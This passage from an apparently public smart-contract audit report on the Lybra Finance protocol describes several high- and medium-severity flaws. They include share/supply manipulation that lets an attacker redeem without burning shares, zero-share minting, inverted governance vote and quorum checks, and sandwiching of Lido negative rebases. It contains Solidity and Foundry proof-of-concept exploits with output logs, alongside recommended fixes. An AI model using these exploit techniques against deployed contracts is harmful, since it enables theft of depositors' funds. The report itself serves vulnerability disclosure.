  * `borrowed[Bob] = 200e18 + 1`
  * `poolTotalEUSDCirculation = 203.7e18`
  * `depositAsset[Bob] = 1e18`
  * `totalDepositedAsset = 7e18`
  * `stETH.balanceOf(protocol) = 7e18`
  * `shares[Alice] = 19`
  * `borrowed[Alice] = 3.7e18`
  * `depositAsset[Alice] = 6e18`

  It shows that almost the gain of Bob is 4 stETH (worth `$`4000).

  The following code simply shows that how this repetitive calling of `rigidRedemption` works:

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

contract LybraPoC {
    mapping(address => uint256) public borrowed;
    mapping(address => uint256) public shares;
    address public Alice = address(1);
    address public Bob = address(2);
    uint256 public bobGain;
    uint256 public num;

    function redeem() public {
        uint256 toBeRedeemed;
        uint256 requiredShares;
        uint256 _totalSupply = 4200e18 + 1;
        uint256 _totalShares = 20;
        shares[Bob] = 1;
        shares[Alice] = 19;
        borrowed[Bob] = 200e18 + 1;
        borrowed[Alice] = 4000e18;
        while (true) {
            num++;
            toBeRedeemed = (_totalSupply % _totalShares == 0)
                ? (_totalSupply / _totalShares) - 1
                : (_totalSupply / _totalShares);
            requiredShares = (toBeRedeemed * _totalShares) / _totalSupply;
            if (toBeRedeemed > borrowed[Alice]) {
                break;
            }
            borrowed[Alice] -= toBeRedeemed;
            _totalSupply -= toBeRedeemed;
            _totalShares -= requiredShares;
            shares[Bob] -= requiredShares;
            bobGain += toBeRedeemed;
        }
    }
}

```

Please note that, Bob does not have enough share to repay his borrow and release all his collateral. So, assuming safe collateral rate is 160%, Bob, at most, can withdraw `1 ETH - 1.6 * (200e18 + 1) = `$`680`. He also gained `$`4000 by redeeming Alice 60 times, so Bob's balance now is: `$`680 + `$`4000 = `$`4680` which means `$`3680 is his total gain that is stolen from the protocol. In other words, protocol has minted some shares without enough stETH backed.

Bob can now start to repay his borrow to reduce `borrowed[Bob]` step by step, without burning any share. For example, first repays 10e18 eUSD, second repays 9e18 eUSD. But, for simplicity, I ignored this calculation, and just focused on redeeming Alice to steal big fund. By repaying multiple of times, `_totalSupply` and `_totalShares` become closer to each other. Then again, it is possible to make it imbalance by providing fake income and attack the next users. Therefore, this attack can be applied multiple of times without any restriction.

Alice is just an example of all the providers in the protocol. If there are other non-provider users also, this scenario is still valid.

* **Second Scenario:** If Alice is liquidated, Bob can liquidate her without burning share again similar to the mechanism described during redeeming.

* **Third Scenario:** Please note that if another innocent user (Eve) is also involved in our example, she will lose funds as well. So, let's say that Eve deposited 20 ETH, and also minted 10000e18 eUSD. So, the state will be:
    *   `shares[Bob] = 1`
    *   `_totalShares = 20 + 47 = 67`
    *   `_totalSupply = 4200e18 + 1 + 10000e18 = 14200e18 + 1`
    *   `borrowed[Bob] = 200e18 + 1`
    *   `poolTotalEUSDCirculation = 4200e18 + 1 + 10000e18 = 14200e18 + 1`
    *   `depositAsset[Bob] = 1e18`
    *   `totalDepositedAsset = 11e18 + 20e18 = 31e18`
    *   `stETH.balanceOf(protocol) = 11e18 + 20e18 = 31e18`
    *   `shares[Alice] = 19`
    *   `borrowed[Alice] = 4000e18`
    *   `depositAsset[Alice] = 10e18`
    *   `shares[Eve] = 47`
    *   `borrowed[Eve] = 10000e18`
    *   `depositAsset[Eve] = 20e18`

Now, suppose only Alice is provider, and Eve is not. So, we can redeem Alice by using the same mechanism we describe in the first scenario. Using the same piece of code for repetitive redemption, we have:

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

contract LybraPoC {
    mapping(address => uint256) public borrowed;
    mapping(address => uint256) public shares;
    address public Alice = address(1);
    address public Bob = address(2);
    address public Eve = address(3);
    uint256 public bobGain;
    uint256 public num;
    uint256 public _totalSupply;
    uint256 public _totalShares;

    function redeem() public {
        uint256 toBeRedeemed;
        uint256 requiredShares;
        _totalSupply = 14200e18 + 1;
        _totalShares = 67;
        shares[Bob] = 1;
        shares[Alice] = 19;
        shares[Eve] = 47;
        borrowed[Bob] = 200e18 + 1;
        borrowed[Alice] = 4000e18;
        borrowed[Eve] = 10000e18;

        while (true) {
            num++;
            toBeRedeemed = (_totalSupply % _totalShares == 0)
                ? (_totalSupply / _totalShares) - 1
                : (_totalSupply / _totalShares);
            requiredShares = (toBeRedeemed * _totalShares) / _totalSupply;
            if (toBeRedeemed > borrowed[Alice]) {
                break;
            }
            borrowed[Alice] -= toBeRedeemed;
            _totalSupply -= toBeRedeemed;
            _totalShares -= requiredShares;
            shares[Bob] -= requiredShares;
            bobGain += toBeRedeemed;
        }
    }
}

```

After redeeming Alice 23 times, the state will be:

*   `shares[Bob] = 1`
*   `_totalShares = 20 + 47 = 67`
*   `_totalSupply = 10200.2e18`
*   `borrowed[Bob] = 200e18 + 1`
*   `poolTotalEUSDCirculation = 10200.2e18 + 1`
*   `depositAsset[Bob] = 1e18`
*   `totalDepositedAsset = 27e18`
*   `stETH.balanceOf(protocol) = 27e18`
*   `shares[Alice] = 19`
*   `borrowed[Alice] = 2.1e17`
*   `depositAsset[Alice] = 6e18`
*   `shares[Eve] = 47`
*   `borrowed[Eve] = 10000e18`
*   `depositAsset[Eve] = 20e18`

Now if Eve wants to repay her whole borrowed amount, she should burn almost 65 shares: `10000e18 * 67 / 10200e18`, but she has only 47 shares. So, she can only repay at most 7155e18 of her borrow. It means that Eve's fund is stolen by Bob. In other words, the collateralized ETH are taken by Bob without burning any shares, so the left shares do not have enough ETH backed.

This scenario shows that Bob made `_totalSupply` and `_totalShares` imbalance, then two innocent users deposited in the protocol and borrowed some eUSD. Since the difference between these two `_totalSupply` and `_totalShares` is large, small amount of shares are minted. Then, Bob redeemed some amount through the user who was provider. By doing so, the values of `_totalSupply` and `_totalShares` become closer to each other. Now if the second user intends to repay her borrow, she should burn more shares that she owns (because the difference of the values `_totalSupply` and `_totalShares` is now smaller).

*   **Fourth Scenario:** Alice can not transfer less than 210e18 eUSD. Because, in the function `_trasnfer`, `_sharesToTransfer = 209e18 * 20 / (4200e18 + 1) = 0`

    <https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/token/EUSD.sol#L153> <br><https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/token/EUSD.sol#L349>

*   **Fifth Scenario:** If protocol stETH balance increases by 0.1stETH through LSD after some time. Bob can buy this income without burning any share, in other words Bob steals the income of the protocol. The flow is as follows:
    *   Bob calls `excessIncomeDistribution(1e17)`.
    
        <https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/LybraStETHVault.sol#L62C14-L62C38>

    *   The `payAmount` will be `100e18`.

        <https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/LybraStETHVault.sol#L66>

    *   If `income >= payAmount`, then `payAmount` should be transferred from Bob to the configurator address.

        <https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/LybraStETHVault.sol#L85>

    *   In the `_transfer`, `100e18` will be converted to shares: `_sharesToTransfer = 100e18 * 20 / (4200e18 + 1) = 0`. So, 0 shares will be deducted from Bob, but 0.1 stETH will be transferred to him.

        <https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/token/EUSD.sol#L348>

</details>

<br>
Please note that for sake of simplicity the fees related to the redemption/liquidation are ignored. So, considering those into our calculation does not make the scenarios invalid.

<br> 

**In Summary:**

Bob makes `_totalSupply` and `_totalShares` imbalance significantly, by just providing fake income in the protocol at day 0. Now that it is imbalanced, he can redeem or liquidate users without burning any shares. He can also steal protocol's income fund without burning any shares.

### Recommended Mitigation Steps

**First Fix:**
During the `_repay`, it should return the amount of burned shares.

<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L279>

So that in the functions `liquidation`, `superLiquidation`, and `rigidRedemption`, again the burned shares should be converted to eUSD; this amount should be used for the rest of calculations.

    function rigidRedemption(address provider, uint256 eusdAmount) external virtual {
            // ...
            uint256 brnedShares = _repay(msg.sender, provider, eusdAmount);
            eusdAmount = getMintedEUSDByShares(brnedShares);
            //...
        }

**Second Fix:**
In the `excessIncomeDistribution`, the same check should be included in the else body as well.

    uint256 sharesAmount = EUSD.getSharesByMintedEUSD(payAmount - income);
                if (sharesAmount == 0) {
                    //EUSD totalSupply is 0: assume that shares correspond to EUSD 1-to-1
                    sharesAmount = (payAmount - income);
                }

<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/LybraStETHVault.sol#L75-L79>

### Assessed type

Context

**[LybraFinance acknowledged](https://github.com/code-423n4/2023-06-lybra-findings/issues/340#issuecomment-1635593185)**

***

## [[H-06] `EUSD.mint` function wrong assumption of cases when calculated sharesAmount = 0](https://github.com/code-423n4/2023-06-lybra-findings/issues/106)
*Submitted by [ktg](https://github.com/code-423n4/2023-06-lybra-findings/issues/106), also found by [Kaysoft](https://github.com/code-423n4/2023-06-lybra-findings/issues/725), [dacian](https://github.com/code-423n4/2023-06-lybra-findings/issues/344), [kutugu](https://github.com/code-423n4/2023-06-lybra-findings/issues/330), [Co0nan](https://github.com/code-423n4/2023-06-lybra-findings/issues/88), [jnrlouis](https://github.com/code-423n4/2023-06-lybra-findings/issues/54), and [n1punp](https://github.com/code-423n4/2023-06-lybra-findings/issues/46)*

### Lines of code

<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/token/EUSD.sol#L299-#L306> <br><https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/token/EUSD.sol#L414-#L418>

### Impact

*   `Mint` function might calculate the `sharesAmount` incorrectly.
*   User can profit by manipulating the protocol to enjoy 1-1 share-eUSD ratio even when share prices is super high.

### Proof of Concept

Currently, the function `EUSD.mint` calls function `EUSD.getSharesByMintedEUSD` to calculate the shares corresponding to the input eUSD amount:

```solidity
function mint(address _recipient, uint256 _mintAmount) external onlyMintVault MintPaused returns (uint256 newTotalShares) {
        require(_recipient != address(0), "MINT_TO_THE_ZERO_ADDRESS");

        uint256 sharesAmount = getSharesByMintedEUSD(_mintAmount);
        if (sharesAmount == 0) {
            //EUSD totalSupply is 0: assume that shares correspond to EUSD 1-to-1
            sharesAmount = _mintAmount;
        }
        ...
}
function getSharesByMintedEUSD(uint256 _EUSDAmount) public view returns (uint256) {
        uint256 totalMintedEUSD = _totalSupply;
        if (totalMintedEUSD == 0) {
            return 0;
        } else {
            return _EUSDAmount.mul(_totalShares).div(totalMintedEUSD);
        }
}
```

As you can see in the comment after `sharesAmount` is checked, `//EUSD totalSupply is 0: assume that shares correspond to EUSD 1-to-1`. The code assumes that if `sharesAmount = 0`, then `totalSupply` must be 0 and the minted share should equal to input eUSD. However, that's not always the case.

Variable `sharesAmount` could be 0 if `totalShares *_EUSDAmount` < `totalMintedEUSD` because this is integer division. If that happens, the user will profit by calling mint with a small EUSD amount and enjoys 1-1 minting proportion (1 share for each eUSD). The reason this can happen is because `EUSD` support `burnShares` feature, which remove the share of a users but keep the `totalSupply` value.

For example:
1.  At the start, Bob is minted 1e18 eUSD, they receive 1e18 shares.
2.  Bob call `burnShares` by `1e18-1`. After this, contract contains 1e18 eUSD and 1 share, which mean 1 share now worth 1e18 eUSD.
3.  If Alice calls `mint` with 1e18 eUSD, then they receive 1 share (since 1 share worth 1e18 eUSD).
4.  However, if they then call `mint` with 1e17 eUSD, they will receive 1e17 shares although 1 share is now worth 1e18 eUSD. This happens because `1e17 * (totalShares = 2) / (totalMintedEUSD = 2e18)` = 0.

Below is POC for the above example. I use foundry to run tests; create a folder named `test` and save this to a file named `eUSD.t.sol`, then run it using command:

`forge test --match-path test/eUSD.t.sol -vvvv`

```solidity
pragma solidity ^0.8.17;

import {Test, console2} from "forge-std/Test.sol";
import {Iconfigurator} from "contracts/lybra/interfaces/Iconfigurator.sol";
import {Configurator} from "contracts/lybra/configuration/LybraConfigurator.sol";
import {GovernanceTimelock} from "contracts/lybra/governance/GovernanceTimeLock.sol";
import {mockCurve} from "contracts/mocks/mockCurve.sol";
import {EUSD} from "contracts/lybra/token/EUSD.sol";

contract TestEUSD is Test {
    address admin = address(0x1111);
    address user1 = address(0x1);
    address user2 = address(0x2);
    address pool = address(0x3);

    Configurator configurator;
    GovernanceTimelock governanceTimeLock;
    mockCurve curve;
    EUSD eUSD;



    function setUp() public{
        // deploy curve
        curve = new mockCurve();
        // deploy governance time lock
        address[] memory proposers = new address[](1);
        proposers[0] = admin;

        address[] memory executors = new address[](1);
        executors[0] = admin;

        governanceTimeLock = new GovernanceTimelock(1, proposers, executors, admin);
        configurator = new Configurator(address(governanceTimeLock), address(curve));

        eUSD = new EUSD(address(configurator));
        // set mintVault to this address
        vm.prank(admin);
        configurator.setMintVault(address(this), true);
    }

    function testRoundingNotCheck() public {
        // Mint some tokens for user1
        eUSD.mint(user1, 1e18);

        assertEq(eUSD.balanceOf(user1), 1e18);
        assertEq(eUSD.totalSupply(), 1e18);

        //
        eUSD.burnShares(user1, 1e18-1);

        assertEq(eUSD.getTotalShares(),1);
        assertEq(eUSD.sharesOf(user1), 1);
        assertEq(eUSD.totalSupply(), 1e18);

        // After this, 1 shares worth 1e18 eUSDs
        // If mintAmount = 1e18 -> receive  1 shares

        eUSD.mint(user2, 1e18);
        assertEq(eUSD.getTotalShares(), 2);
        assertEq(eUSD.sharesOf(user2), 1);
        assertEq(eUSD.totalSupply(), 2e18);

        // However, if mintAmount = 1e17 -> receive 1e17 shares

        eUSD.mint(user2, 1e17);

        assertEq(eUSD.sharesOf(user2), 1 + 1e17);


    }

}
```

### Tools Used

Manual Review

### Recommended Mitigation Steps

I recommend checking again in `EUSD.mint` function if `sharesAmount` is 0 and `totalSupply` is not 0, then exit the function without minting anything.

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/106#issuecomment-1635617210)**

***

## [[H-07] `_voteSucceeded()` returns true when `againstVotes > forVotes` and vice versa](https://github.com/code-423n4/2023-06-lybra-findings/issues/15)
*Submitted by [T1MOH](https://github.com/code-423n4/2023-06-lybra-findings/issues/15), also found by [yjrwkk](https://github.com/code-423n4/2023-06-lybra-findings/issues/985), [josephdara](https://github.com/code-423n4/2023-06-lybra-findings/issues/978), [devival](https://github.com/code-423n4/2023-06-lybra-findings/issues/943), [KupiaSec](https://github.com/code-423n4/2023-06-lybra-findings/issues/777), [LaScaloneta](https://github.com/code-423n4/2023-06-lybra-findings/issues/744), [cccz](https://github.com/code-423n4/2023-06-lybra-findings/issues/684), [Iurii3](https://github.com/code-423n4/2023-06-lybra-findings/issues/668), [pep7siup](https://github.com/code-423n4/2023-06-lybra-findings/issues/367), [0xnev](https://github.com/code-423n4/2023-06-lybra-findings/issues/324), [bytes032](https://github.com/code-423n4/2023-06-lybra-findings/issues/231), [bytes032](https://github.com/code-423n4/2023-06-lybra-findings/issues/229), [skyge](https://github.com/code-423n4/2023-06-lybra-findings/issues/211), and [sces60107](https://github.com/code-423n4/2023-06-lybra-findings/issues/151)*

As a result, voting process is broken, as it won't execute proposals with most of `forVotes`. Instead, it will execute proposals with most of `againstVotes`.

### Proof of Concept

It returns whether number of votes with support = 1 is greater than with support = 0:

```solidity
    function _voteSucceeded(uint256 proposalId) internal view override returns (bool){
        return proposalData[proposalId].supportVotes[1] > proposalData[proposalId].supportVotes[0];
    }
```

However support = 1 means `againstVotes`, and support = 0 means `forVotes`:

<https://github.com/code-423n4/2023-06-lybra/blob/26915a826c90eeb829863ec3851c3c785800594b/contracts/lybra/governance/LybraGovernance.sol#L120-L122>

```solidity
    function proposals(uint256 proposalId) external view returns (...) {
        ...
        
        forVotes =  proposalData[proposalId].supportVotes[0];
        againstVotes =  proposalData[proposalId].supportVotes[1];
        abstainVotes =  proposalData[proposalId].supportVotes[2];

        ...
    }
```

### Tools Used

Manual Review

### Recommended Mitigation Steps

Swap 1 and 0:

```solidity
    function _voteSucceeded(uint256 proposalId) internal view override returns (bool){
        return proposalData[proposalId].supportVotes[0] > proposalData[proposalId].supportVotes[1];
    }
```

### Assessed type

Governance

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/15#issuecomment-1635626666)**

***

## [[H-08] Governance wrongly calculates `_quorumReached()`](https://github.com/code-423n4/2023-06-lybra-findings/issues/14)
*Submitted by [T1MOH](https://github.com/code-423n4/2023-06-lybra-findings/issues/14), also found by [josephdara](https://github.com/code-423n4/2023-06-lybra-findings/issues/972), [yjrwkk](https://github.com/code-423n4/2023-06-lybra-findings/issues/971), [LokiThe5th](https://github.com/code-423n4/2023-06-lybra-findings/issues/676), [Iurii3](https://github.com/code-423n4/2023-06-lybra-findings/issues/671), [squeaky\_cactus](https://github.com/code-423n4/2023-06-lybra-findings/issues/286), [skyge](https://github.com/code-423n4/2023-06-lybra-findings/issues/180), and [zambody](https://github.com/code-423n4/2023-06-lybra-findings/issues/95)*

For some reason it is calculated as sum of `againstVotes` and `abstainVotes` instead of `totalVotes` on proposal. As the result, quorum will be reached only if >=1/3 of all votes are abstain or against, which doesn't make sense.

### Proof of Concept

Number of votes with support = 1 and support = 2 is summed up:

```solidity
    function _quorumReached(uint256 proposalId) internal view override returns (bool){
        return proposalData[proposalId].supportVotes[1] + proposalData[proposalId].supportVotes[2] >= quorum(proposalSnapshot(proposalId));
    }
```

However support = 1 means against votes, support = 2 means abstain votes:

<https://github.com/code-423n4/2023-06-lybra/blob/26915a826c90eeb829863ec3851c3c785800594b/contracts/lybra/governance/LybraGovernance.sol#L120-L122>

```solidity
    function proposals(uint256 proposalId) external view returns (...) {
        ...
        
        forVotes =  proposalData[proposalId].supportVotes[0];
        againstVotes =  proposalData[proposalId].supportVotes[1];
        abstainVotes =  proposalData[proposalId].supportVotes[2];

        ...
    }
```

### Tools Used

Manual review

### Recommended Mitigation Steps

Use `totalVotes`:

```solidity
    function _quorumReached(uint256 proposalId) internal view override returns (bool){
        return proposalData[proposalId].totalVotes >= quorum(proposalSnapshot(proposalId));
    }
```

### Assessed type

Governance

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/14#issuecomment-1635627797)**

***

# Medium Risk Findings (23)
## [[M-01] Wrong `proposalThreshold` amount in `LybraGovernance.sol`](https://github.com/code-423n4/2023-06-lybra-findings/issues/942)
*Submitted by [devival](https://github.com/code-423n4/2023-06-lybra-findings/issues/942)*

The proposal can be created with only 100\_000 esLBR delegated instead of 10\_000\_000.

### Proof of Concept

According to [LybraV2Docs](https://docs.lybra.finance/lybra-v2-technical-beta/governance/process/propose#threshold), a proposal can only be created if the sender has at least 10 million esLBR tokens delegated to their address to meet the proposal threshold.

In [LybraGovernance.sol#L172-L174](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/governance/LybraGovernance.sol#L172-L174), the proposal threshold is set to only `1e23` which equals to `100_000` as esLBR has 18 decimals.

        function proposalThreshold() public pure override returns (uint256) {
            return 1e23;
        }

### Tools Used

Manual Review

### Recommended Mitigation Steps

In [LybraGovernance.sol#L173](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/governance/LybraGovernance.sol#L173) replace `1e23` with `1e25`

Alternatively, the team can update the documentation stating that it is only required 100\_000 esLBR tokens (0.1% of the total LBR supply) delegated to meet the proposal threshold.

### Assessed type

Math

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/942#issuecomment-1639306741)**

***

## [[M-02] Exploiter can avoid negative Lido rebases stealing funds from EUSD vaults](https://github.com/code-423n4/2023-06-lybra-findings/issues/931)
*Submitted by [georgypetrov](https://github.com/code-423n4/2023-06-lybra-findings/issues/931), also found by [3agle](https://github.com/code-423n4/2023-06-lybra-findings/issues/765), [0xRobocop](https://github.com/code-423n4/2023-06-lybra-findings/issues/408), and [max10afternoon](https://github.com/code-423n4/2023-06-lybra-findings/issues/363)*

Lybra keeps the exact amount of collateral as deposited ignoring any lido rebases.

<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L79><br>
<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L103>

That allows malicious users to sandwich negative rebase transactions with depositing and withdrawing their stETH saving the exact amount as before negative rebase. The user can wait for 3 days or have a fee discount using `rigidRedemption` of self, which it makes applicable to a fee `(safeCollateralRatio - 100) / safeCollateralRatio * redemptionFee` part of the deposit.

### Impact

The protocol will have additional losses in that case because the negative rebase decreases the cost of stETH share and the protocol withdraws the same amount of stETH as deposited to the malicious user, transferring more shares than deposited.

### Proof of Concept

Should be launched with mainnet fork:

<details>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {LybraProxy} from "@lybra/Proxy/LybraProxy.sol";
import {LybraProxyAdmin} from "@lybra/Proxy/LybraProxyAdmin.sol";
// import {AdminTimelock} from "@lybra/governance/AdminTimelock.sol";
import {GovernanceTimelock} from "@lybra/governance/GovernanceTimelock.sol";
// import {LybraWBETHVault} from "@lybra/pools/LybraWbETHVault.sol";
import {esLBR} from "@lybra/token/esLBR.sol";
import {LybraWstETHVault} from "@lybra/pools/LybraWstETHVault.sol";
// import {LybraRETHVault} from "@lybra/pools/LybraRETHVault.sol";
// import {PeUSD} from "@lybra/token/PeUSD.sol";
import {esLBRBoost} from "@lybra/miner/esLBRBoost.sol";
import {LBR} from "@lybra/token/LBR.sol";
import {LybraStETHDepositVault} from "@lybra/pools/LybraStETHVault.sol";
// import {StakingRewardsV2} from "@lybra/miner/stakerewardV2pool.sol";
// import {LybraGovernance} from "@lybra/governance/LybraGovernance.sol";
import {PeUSDMainnet} from "@lybra/token/PeUSDMainnetStableVision.sol";
import {ProtocolRewardsPool} from "@lybra/miner/ProtocolRewardsPool.sol";
// import {EUSD} from "@lybra/token/EUSD.sol";
import {Configurator} from "@lybra/configuration/LybraConfigurator.sol";
import {EUSDMiningIncentives} from "@lybra/miner/EUSDMiningIncentives.sol";
// import {LybraEUSDVaultBase} from "@lybra/pools/base/LybraEUSDVaultBase.sol";
// import {LybraPeUSDVaultBase} from "@lybra/pools/base/LybraPeUSDVaultBase.sol";
import {mockChainlink} from "@mocks/chainLinkMock.sol";
import {stETHMock} from "@mocks/stETHMock.sol";
import {EUSDMock} from "@mocks/mockEUSD.sol";
import {mockCurve} from "@mocks/mockCurve.sol";
import {mockUSDC} from "@mocks/mockUSDC.sol";
import {mockLBRPriceOracle} from "@mocks/mockLBRPriceOracle.sol";

/* remappings used
@lybra=contracts/lybra/
@mocks=contracts/mocks/
 */
contract LybraV2Test is Test {
    address goerliEndPoint = 0xbfD2135BFfbb0B5378b56643c2Df8a87552Bfa23;

    LybraProxy proxy;
    LybraProxyAdmin admin;
    // AdminTimelock timeLock;
    GovernanceTimelock govTimeLock;
    // LybraWbETHVault wbETHVault;
    // esLBR lbr;
    // LybraWstETHVault stETHVault;
    mockChainlink oracle;
    mockLBRPriceOracle lbrOracleMock;
    esLBRBoost eslbrBoost;
    mockUSDC usdc;
    mockCurve curve;
    Configurator configurator;
    LBR lbr;
    esLBR eslbr;
    EUSDMock usd;
    EUSDMiningIncentives eusdMiningIncentives;
    ProtocolRewardsPool rewardsPool;
    LybraStETHDepositVault stETHVault;
    PeUSDMainnet peUsdMainnet;
    address owner = address(7);
    // admins && executers of GovernanceTimelock
    address[] govTimelockArr;
    address stETHWhale = 0x1982b2F5814301d4e9a8b0201555376e62F82428;
    IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    address exploiter = address(0x1);

    function setUp() public {
        vm.startPrank(owner);
        oracle = new mockChainlink();
        lbrOracleMock = new mockLBRPriceOracle();
        govTimelockArr.push(owner);
        govTimeLock = new GovernanceTimelock(
            1,
            govTimelockArr,
            govTimelockArr,
            owner
        );
        eslbrBoost = new esLBRBoost();
        usdc = new mockUSDC();
        curve = new mockCurve();
        //  _dao , _curvePool
        configurator = new Configurator(address(govTimeLock), address(curve));
        // _config , _sharedDecimals , _lzEndpoint
        lbr = new LBR(address(configurator), 8, goerliEndPoint);
        // _config
        eslbr = new esLBR(address(configurator));
        // _config
        usd = new EUSDMock(address(configurator));

        configurator.initToken(address(usd), address(peUsdMainnet));
        // _config, _boost, _etherOracle, _lbrOracle
        eusdMiningIncentives = new EUSDMiningIncentives(
            address(configurator),
            address(eslbrBoost),
            address(oracle),
            address(lbrOracleMock)
        );
        // _config
        rewardsPool = new ProtocolRewardsPool(address(configurator));
        
        // _config, _stETH, _oracle
        stETHVault = new LybraStETHDepositVault(
            address(configurator),
            address(stETH),
            address(oracle)
        );
        // _config, _sharedDecimals, _lzEndpoint
        peUsdMainnet = new PeUSDMainnet(
            address(configurator),
            8,
            goerliEndPoint
        );

        curve.setToken(address(usd), address(usdc));
        configurator.setMintVault(address(stETHVault), true);
        configurator.setPremiumTradingEnabled(true);
        configurator.setMintVaultMaxSupply(
            address(stETHVault),
            10_000_000_000 ether
        );
        configurator.setBorrowApy(address(stETHVault), 200);
        configurator.setEUSDMiningIncentives(address(eusdMiningIncentives));
        eusdMiningIncentives.setToken(address(lbr), address(eslbr));
        rewardsPool.setTokenAddress(
            address(eslbr),
            address(lbr),
            address(eslbrBoost)
        );

        // Missing configurator.initEUSD(this.EUSDMock.address) as initEUSD in configurator does not exist.
        // And it's not same as initToken. 
        vm.stopPrank();

        vm.startPrank(stETHWhale);
        stETH.approve(address(stETHVault), 1_000_000e18);
        stETHVault.depositAssetToMint(100_000e18, 0);
        stETH.transfer(exploiter, 1000e18);
        vm.stopPrank();
    }
    
    function negativeRebaseLido() internal {
        bytes32 BUFFERED_ETHER_POSITION =
            0xed310af23f61f96daefbcd140b306c0bdbf8c178398299741687b90e794772b0; // keccak256("lido.Lido.bufferedEther");
        vm.store(address(stETH), BUFFERED_ETHER_POSITION, bytes32(0));
    }

    function testV2AvoidingRebaseLossesWithRigid() public {
        console.log("lybra balance before rebase: ", stETH.balanceOf(address(stETHVault)));
        uint256 exploiterBalance = stETH.balanceOf(exploiter);
        vm.startPrank(exploiter);
        stETH.approve(address(stETHVault), exploiterBalance);
        console.log("exploiter balance before rebase: ", stETH.balanceOf(exploiter));
        uint256 toBorrow = exploiterBalance * oracle.fetchPrice() * 100 / configurator.getSafeCollateralRatio(address(stETHVault));
        stETHVault.depositAssetToMint(exploiterBalance, toBorrow);
        
        negativeRebaseLido();
        
        configurator.becomeRedemptionProvider(true);
        stETHVault.rigidRedemption(exploiter, toBorrow);
        stETHVault.withdraw(exploiter, stETHVault.depositedAsset(exploiter));
        console.log("exploiter balance after rebase: ", stETH.balanceOf(exploiter));
        console.log("lybra balance after rebase: ", stETH.balanceOf(address(stETHVault)));
        vm.stopPrank();
    }

        function testV2AvoidingRebaseLossesWaitFor3Days() public {
        console.log("lybra balance before rebase: ", stETH.balanceOf(address(stETHVault)));
        uint256 exploiterBalance = stETH.balanceOf(exploiter);
        vm.startPrank(exploiter);
        stETH.approve(address(stETHVault), exploiterBalance);
        console.log("exploiter balance before rebase: ", stETH.balanceOf(exploiter));
        stETHVault.depositAssetToMint(exploiterBalance, 0);
        negativeRebaseLido();

        vm.warp(block.timestamp + 3 days);
        stETHVault.withdraw(exploiter, exploiterBalance);
        console.log("exploiter balance after rebase: ", stETH.balanceOf(exploiter));
        console.log("lybra balance after rebase: ", stETH.balanceOf(address(stETHVault)));
        vm.stopPrank();
    }

    function testV2NormalRebaseLosses() public {
        console.log("lybra balance before rebase: ", stETH.balanceOf(address(stETHVault)));
        console.log("exploiter balance before rebase: ", stETH.balanceOf(exploiter));
        negativeRebaseLido();
        console.log("exploiter balance after rebase: ", stETH.balanceOf(exploiter));
        console.log("lybra balance after rebase: ", stETH.balanceOf(address(stETHVault)));
    }
}
```
Logs:

    Running 3 tests for test/LybraV2.sol:LybraV2Test
    [PASS] testV2AvoidingRebaseLossesWaitFor3Days() (gas: 166689)
    Logs:
      lybra balance before rebase:  99999999999999999999999
      exploiter balance before rebase:  1000000000002315874593
      exploiter balance after rebase:  1000000000002315874593
      lybra balance after rebase:  99904387650376337889471

    [PASS] testV2AvoidingRebaseLossesWithRigid() (gas: 393436)
    Logs:
      lybra balance before rebase:  99999999999999999999999
      exploiter balance before rebase:  1000000000002315874593
      exploiter balance after rebase:  999621875002314998902
      lybra balance after rebase:  99904765775376338765162

    [PASS] testV2NormalRebaseLosses() (gas: 74877)
    Logs:
      lybra balance before rebase:  99999999999999999999999
      exploiter balance before rebase:  1000000000002315874593
      exploiter balance after rebase:  999053343075346752371
      lybra balance after rebase:  99905334307303307011693

</details>

### Tools Used

Foundry, mainnet forking.

### Recommended Mitigation Steps

Need to handle losses in a different way, rather than just waiting for positive rebases to cover losses or deprecate rebase collateral vaults.

**[0xean (judge) commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/931#issuecomment-1656227273):**
 > @LybraFinance - this one is slightly unique and I believe incorrectly duped.  Your response may be the same, but wanted to have you take a look. 

**[LybraFinance acknowledged and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/931#issuecomment-1656632844):**
 > We chose to ignore the negative change of rebase.

**[0xean (judge) decreased severity to Medium](https://github.com/code-423n4/2023-06-lybra-findings/issues/931#issuecomment-1662336385)**

***

## [[M-03] Impossibility to change `safeCollateralRatio`](https://github.com/code-423n4/2023-06-lybra-findings/issues/882)
